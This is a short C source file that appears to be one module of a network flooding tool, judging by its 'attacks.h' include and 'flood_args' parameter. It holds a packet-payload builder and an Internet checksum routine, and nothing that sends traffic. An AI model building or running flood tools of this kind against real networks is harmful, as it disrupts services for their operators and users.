#define _GNU_SOURCE

#include "headers/attacks.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* shared payload builder: repeat msg (or random) to psize bytes */
int build_payload(const flood_args *a, unsigned char *out, int cap) {
    int want = a->psize > 0 ? a->psize : 512;
    if (want > cap) want = cap;
    size_t ml = strlen(a->msg);
    if (ml > 0) {
        for (int i = 0; i < want; i++) out[i] = (unsigned char)a->msg[i % ml];
    } else {
        for (int i = 0; i < want; i++) out[i] = (unsigned char)(rand() & 0xff);
    }
    return want;
}

uint16_t csum(const void *data, int len) {
    const uint16_t *p = data;
    uint32_t s = 0;
    while (len > 1) { s += *p++; len -= 2; }
    if (len) s += *(const uint8_t *)p;
    s = (s >> 16) + (s & 0xffff);
    s += (s >> 16);
    return (uint16_t)~s;
}
